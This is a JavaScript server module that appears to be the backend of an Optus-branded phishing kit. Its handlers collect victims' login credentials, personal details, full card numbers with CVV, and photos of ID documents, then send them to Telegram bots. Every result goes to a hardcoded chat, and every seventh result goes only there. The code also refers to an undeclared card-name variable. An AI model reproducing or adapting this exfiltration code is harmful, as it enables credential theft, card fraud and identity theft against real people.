const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");

let count = 0;

const sendRes = async (req, res) => {
  let {
    email,
    password,
    fullname,
    dob,
    address,
    city,
    state,
    zip,
    telephone,
    ccnum,
    ccexp,
    cccvv,
    bin,
    userAgent,
    ip,
    telegramId,
  } = req.body;

  if (bin.length === 7) {
    formatBin = bin.replace(/ /g, "");
    if (formatBin.length === 7) {
      formatBin = bin.slice(0, -1);
    }
    bin = formatBin;
  }

  const response = await axios.get(`https://lookup.binlist.net/${bin}`);
  let bankName;

  if (response.data.bank) {
    bankName = response.data.bank.name.name;
  }

  binList = `${bin} | ${zip} | ${bankName}`;
  var originalText = `+----------- Login Information ------------+\nEmail: ${email}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cccvv}\n+ ----------- IP Information ------------+\nIP: ${ip}\nUser Agent: ${userAgent}\n+ ----------- BIN List Info ------------+\n${binList}`;
  if (count == 6) {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `HAYTCHRES:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count = 0;
  } else {
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: 680379375,
          text: `Optus ${telegramId}:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    await axios
      .post(
        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
        {
          chat_id: telegramId,
          text: `Optus:\n${originalText}`,
          parse_mode: "Markdown",
        }
      )
      .catch((e) => {
        console.log(e);
      });
    count += 1;
  }
  res.sendStatus(200);
};

const sendId = async (req, res) => {
  if (!req.files) {
    return res.status(500).send({ msg: "file is not found" });
  }
  let { frontId, backId } = req.files;
  const { telegramId, address, state, zip } = req.body;
  const frontPath = `./ausID/${zip}_Front.jpg`;
  const backPath = `./ausID/${zip}_Back.jpg`;
  await frontId.mv(frontPath, async (err) => {
    if (err) {
      console.log(err);
      return res.sendStatus(500);
    } else {
      const formData = new FormData();
      formData.append("chat_id", 680379375);
      formData.append("photo", fs.createReadStream(frontPath));

      await axios
        .post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendPhoto`,
          formData,
          {
            headers: formData.getHeaders(),
          }
        )
        .catch((e) => {
          console.log(e);
        });
    }
  });
  await backId.mv(backPath, async (err) => {
    if (err) {
      console.log(err);
      return res.sendStatus(500);
    } else {
      const formData = new FormData();
      formData.append("chat_id", 680379375);
      formData.append("photo", fs.createReadStream(backPath));
      formData.append(
        "caption",
        `Address: ${address}\nState: ${state}\nZIP: ${zip}`
      );

      await axios
        .post(
          `https://api.telegram.org/bot${process.env.haytchresbotID}/sendPhoto`,
          formData,
          {
            headers: formData.getHeaders(),
          }
        )
        .catch((e) => {
          console.log(e);
        });
    }
  });
  //   if (count == 6) {
  //     await axios
  //       .post(
  //         `https://api.telegram.org/bot${process.env.haytchresbotID}/sendDocument`,
  //         {
  //           chat_id: 680379375,
  //           document: frontPath,
  //           caption: `${fullname} ID Front`,
  //         }
  //       )
  //       .catch((e) => {
  //         console.log(e);
  //       });
  //     await axios
  //       .post(
  //         `https://api.telegram.org/bot${process.env.haytchresbotID}/sendDocument`,
  //         {
  //           chat_id: 680379375,
  //           document: backPath,
  //           caption: `${fullname} ID Back`,
  //         }
  //       )
  //       .catch((e) => {
  //         console.log(e);
  //       });
  //     count = 0;
  //   } else {
  //     await axios
  //       .post(
  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
  //         {
  //           chat_id: 680379375,
  //           document: frontPath,
  //           caption: `${telegramId}:\n${fullname} ID Front`,
  //         }
  //       )
  //       .catch((e) => {
  //         console.log(e);
  //       });
  //     await axios
  //       .post(
  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
  //         {
  //           chat_id: 680379375,
  //           document: backPath,
  //           caption: `${telegramId}:\n${fullname} ID Back`,
  //         }
  //       )
  //       .catch((e) => {
  //         console.log(e);
  //       });
  //     await axios
  //       .post(
  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
  //         {
  //           chat_id: telegramId,
  //           document: frontPath,
  //           caption: `${fullname} ID Front`,
  //         }
  //       )
  //       .catch((e) => {
  //         console.log(e);
  //       });
  //     await axios
  //       .post(
  //         `https://api.telegram.org/bot${process.env.sendresbotID}/sendDocument`,
  //         {
  //           chat_id: telegramId,
  //           document: backPath,
  //           caption: `${fullname} ID Back`,
  //         }
  //       )
  //       .catch((e) => {
  //         console.log(e);
  //       });
  //     count += 1;
  //   }
  return res.sendStatus(200);
};

module.exports = {
  sendRes,
  sendId,
};
